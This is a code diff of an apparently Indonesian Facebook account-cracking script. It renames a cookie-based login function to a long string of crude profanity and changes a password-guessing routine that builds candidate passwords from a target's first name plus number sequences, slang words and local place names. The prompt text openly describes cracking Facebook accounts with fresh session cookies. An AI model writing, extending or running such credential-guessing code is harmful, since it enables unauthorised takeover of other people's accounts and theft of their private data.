@@ -340,7 +340,7 @@ def login123():
 	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi",style=f"bold white"))
 	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
 	if vevek in ['1','01']:
-		login_lagi334()
+		laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok()
 	elif vevek in ['2','02']:
 		doa_halal()
 	elif vevek in ['3','03']:
@@ -379,7 +379,7 @@ def login():
 	except IOError:
 		login123()
 		
-def login_lagi334():
+def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
 	try:
 		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,style=f"bold white"))
 		your_cookies = input(' Cookie  : ')
@@ -1409,18 +1409,7 @@ def passwrd():
 						pass
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'@')
-						pwv.append(frs+'0')
 						pwv.append(frs+'1')
-						pwv.append(frs+'2')
-						pwv.append(frs+'3')
-						pwv.append(frs+'4')
-						pwv.append(frs+'5')
-						pwv.append(frs+'6')
-						pwv.append(frs+'7')
-						pwv.append(frs+'8')
-						pwv.append(frs+'9')
-						pwv.append(frs+'00')
 						pwv.append(frs+'01')
 						pwv.append(frs+'02')
 						pwv.append(frs+'03')
@@ -1430,54 +1419,19 @@ def passwrd():
 						pwv.append(frs+'07')
 						pwv.append(frs+'08')
 						pwv.append(frs+'09')
-						pwv.append(frs+'10')
 						pwv.append(frs+'12')
+						pwv.append(frs+'321')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'12')
+						pwv.append(frs+'321')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-						pwv.append(frs+'1234567')
-						pwv.append(frs+'12345678')
-						pwv.append(frs+'123456789')
-						pwv.append(frs+'21')
-						pwv.append(frs+'321')
-						pwv.append(frs+'4321')
-						pwv.append(frs+'54321')
-						pwv.append(frs+'654321')
-						pwv.append(frs+'7654321')
-						pwv.append(frs+'87654321')
-						pwv.append(frs+'987654321')
-						pwv.append(frs+'pepek')
-						pwv.append(frs+'sayang')
-						pwv.append(frs+'bangsat')
-						pwv.append(frs+'anjing')
-						pwv.append(frs+'kampang')
-						pwv.append(frs+'ngentot')
-						pwv.append(frs+'ngewe')
-						pwv.append(frs+'monyet')
-						pwv.append(frs+'telkomsel')
-						pwv.append(frs+'pepek')
-						pwv.append(frs+'lampung')
-						pwv.append(frs+'sukadana')
-						pwv.append(frs+'jokowi')
-						pwv.append(frs+'sayank')
-						pwv.append(frs+'cantik')
-						pwv.append(frs+'anjay')
-						pwv.append(frs+'memek')
-						pwv.append(frs+'sayang')
-						pwv.append(frs+'jancok')
-						pwv.append(frs+'kontol')
-						pwv.append(frs+'bintang')
-						pwv.append(frs+'termux')
-
 				else:
-
 					if len(frs)<3:
-
 						pwv.append(nmf)
-
 					else:
-
 						pwv.append(nmf)
 						pwv.append(frs+'@')
 						pwv.append(frs+'0')
@@ -1528,6 +1482,7 @@ def passwrd():
 						pwv.append(frs+'telkomsel')
 						pwv.append(frs+'pepek')
 						pwv.append(frs+'lampung')
+						pwv.append(frs+'indonesia')
 						pwv.append(frs+'sukadana')
 						pwv.append(frs+'jokowi')
 						pwv.append(frs+'sayank')
